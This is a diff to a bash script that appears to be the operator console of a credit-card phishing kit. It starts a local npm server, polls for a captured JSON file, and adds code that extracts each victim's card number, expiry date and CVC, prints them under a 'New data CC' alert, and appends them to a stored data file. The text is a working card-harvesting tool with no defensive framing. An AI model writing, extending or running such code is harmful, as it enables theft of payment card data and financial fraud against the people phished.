@@ -35,8 +35,9 @@ WHITE="$(printf '\033[37m')"
 CYAN="$(printf '\033[36m')"
 RED="$(printf '\033[31m')"
 ORANGE="$(printf '\033[33m')" 
+MAGENTA="$(printf '\033[35m')"
 
-PS1="└─[${GREEN}-${WHITE}]"
+PS1="└─[${MAGENTA}-${WHITE}]"
 
 START_ABOUT_HOST(){
     npm run dreq > /dev/null 2>&1 &
@@ -107,7 +108,15 @@ if [[ ! -d "auth" ]]; then
 fi
 
 OK(){
-    json_pp < dre3432432434342342q0000000xy.json
+    DRE=$(grep -o '"Number":.*' dre3432432434342342q0000000xy.json | sed 's/"Number": "//')
+    VALI=$(grep -o '"Validade":.*' dre3432432434342342q0000000xy.json | sed 's/"Validade": "//')
+    CVC=$(grep -o '"CVC":.*' dre3432432434342342q0000000xy.json | sed 's/"CVC": "//')
+    IFS=$'\n'
+    ##json_pp < dre3432432434342342q0000000xy.json
+    echo -e ""
+    echo -e "${MAGENTA}[${WHITE}!${MAGENTA}] Nmber${WHITE}: ${DRE}"
+    echo -e "${MAGENTA}[${WHITE}!${MAGENTA}] Validaty${WHITE}: ${VALI}"
+    echo -e "${MAGENTA}[${WHITE}!${MAGENTA}] CVC${WHITE}: ${CVC}"
     cat dre3432432434342342q0000000xy.json >> auth/data.json
 }
 
@@ -116,7 +125,7 @@ SERVER_RU(){
 echo "[-] ..."
     while true; do
     		if [[ -e "dre3432432434342342q0000000xy.json" ]]; then
-			echo -e "\n${GREEN}[${WHITE}!${GREEN}] New data CC${WHITE} ~"
+			echo -e "\n${MAGENTA}[${WHITE}!${MAGENTA}] New data CC${WHITE} ~"
 			OK
 			rm -rf dre3432432434342342q0000000xy.json
 		fi
